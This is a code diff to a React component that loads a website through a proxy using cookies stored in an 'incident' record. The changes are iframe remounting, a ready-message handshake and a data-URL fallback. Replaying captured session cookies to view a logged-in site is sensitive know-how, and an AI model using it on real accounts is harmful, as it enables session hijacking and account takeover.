@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { Globe, RefreshCw, ExternalLink, AlertCircle } from "lucide-react";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -24,6 +24,8 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   const [error, setError] = useState<string | null>(null);
   const [cookies, setCookies] = useState<any[]>([]);
   const [currentUrl, setCurrentUrl] = useState<string | null>(null);
+  const [iframeKey, setIframeKey] = useState(0);
+  const readyTimeoutRef = useRef<number | null>(null);
 
   useEffect(() => {
     // Try to get cookies from multiple sources (both snake_case and camelCase)
@@ -93,15 +95,26 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     }
   }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);
 
-  // Listen for navigation messages from iframe
+  // Listen for navigation and ready messages from iframe
   useEffect(() => {
     const handleMessage = async (event: MessageEvent) => {
+      // Handle proxy:ready signal
+      if (event.data?.type === 'proxy:ready') {
+        console.log('[LiveSiteViewer] ✅ proxy:ready recebido para:', event.data.url);
+        if (readyTimeoutRef.current) {
+          clearTimeout(readyTimeoutRef.current);
+          readyTimeoutRef.current = null;
+        }
+        return;
+      }
+      
+      // Handle navigation
       if (event.data?.type === 'proxy:navigate') {
         const { url, incidentId } = event.data;
         
         if (incidentId !== incident.id) return;
         
-        console.log('[LiveSiteViewer] Navigation requested:', url);
+        console.log('[LiveSiteViewer] proxy:navigate →', url);
         setError(null);
         setCurrentUrl(url);
         
@@ -121,9 +134,28 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
           
           if (response.ok) {
             const html = await response.text();
-            console.log('[LiveSiteViewer] Navigation successful, updating srcDoc');
+            console.log('[LiveSiteViewer] POST OK → srcDoc atualizado');
+            
+            // Clear any existing timeout
+            if (readyTimeoutRef.current) {
+              clearTimeout(readyTimeoutRef.current);
+            }
+            
+            // Force iframe remount and set new content
+            setIframeKey(k => k + 1);
             setSrcDoc(html);
             setProxyUrl(null);
+            
+            // Setup ready timeout with data URL fallback
+            console.log('[LiveSiteViewer] srcDoc set → aguardando proxy:ready…');
+            readyTimeoutRef.current = window.setTimeout(() => {
+              console.warn('[LiveSiteViewer] ⚠️ timeout → usando data URL fallback');
+              const dataUrl = `data:text/html;charset=utf-8;base64,${btoa(unescape(encodeURIComponent(html)))}`;
+              setSrcDoc(null);
+              setProxyUrl(dataUrl);
+              setIframeKey(k => k + 1);
+            }, 1500);
+            
             toast.success('Página carregada');
           } else {
             throw new Error(`Failed to load: ${response.status}`);
@@ -137,7 +169,12 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     };
     
     window.addEventListener('message', handleMessage);
-    return () => window.removeEventListener('message', handleMessage);
+    return () => {
+      window.removeEventListener('message', handleMessage);
+      if (readyTimeoutRef.current) {
+        clearTimeout(readyTimeoutRef.current);
+      }
+    };
   }, [incident.id, cookies]);
 
   const loadSiteWithCookies = async () => {
@@ -163,10 +200,29 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
 
       if (postResp.ok) {
         const text = await postResp.text();
-        console.log('✅ POST renderizado como HTML (srcDoc).');
+        console.log('[LiveSiteViewer] POST renderizado como HTML');
+        
+        // Clear any existing timeout
+        if (readyTimeoutRef.current) {
+          clearTimeout(readyTimeoutRef.current);
+        }
+        
+        // Force iframe remount and set content
+        setIframeKey(k => k + 1);
         setSrcDoc(text);
         setProxyUrl(null);
         setCurrentUrl(incident.tab_url);
+        
+        // Setup ready timeout with data URL fallback
+        console.log('[LiveSiteViewer] srcDoc set → aguardando proxy:ready…');
+        readyTimeoutRef.current = window.setTimeout(() => {
+          console.warn('[LiveSiteViewer] ⚠️ timeout → usando data URL fallback');
+          const dataUrl = `data:text/html;charset=utf-8;base64,${btoa(unescape(encodeURIComponent(text)))}`;
+          setSrcDoc(null);
+          setProxyUrl(dataUrl);
+          setIframeKey(k => k + 1);
+        }, 1500);
+        
         toast.success('Site renderizado via proxy');
         return;
       } else {
@@ -274,25 +330,25 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
 
         {srcDoc && (
           <iframe
-            key="srcdoc"
+            key={`srcdoc-${iframeKey}`}
             srcDoc={srcDoc}
             className="w-full h-full border-0"
             sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
             title={`Site: ${incident.host}`}
-            onLoad={() => console.log('✅ Iframe srcDoc loaded successfully')}
-            onError={(e) => console.error('❌ Iframe srcDoc load error:', e)}
+            onLoad={() => console.log('[LiveSiteViewer] Iframe srcDoc carregado')}
+            onError={(e) => console.error('[LiveSiteViewer] Iframe srcDoc erro:', e)}
           />
         )}
 
         {!srcDoc && proxyUrl && (
           <iframe
-            key={proxyUrl}
+            key={`proxy-${iframeKey}`}
             src={proxyUrl}
             className="w-full h-full border-0"
             sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
             title={`Site: ${incident.host}`}
-            onLoad={() => console.log('✅ Iframe loaded successfully')}
-            onError={(e) => console.error('❌ Iframe load error:', e)}
+            onLoad={() => console.log('[LiveSiteViewer] Iframe carregado via URL')}
+            onError={(e) => console.error('[LiveSiteViewer] Iframe URL erro:', e)}
           />
         )}
 
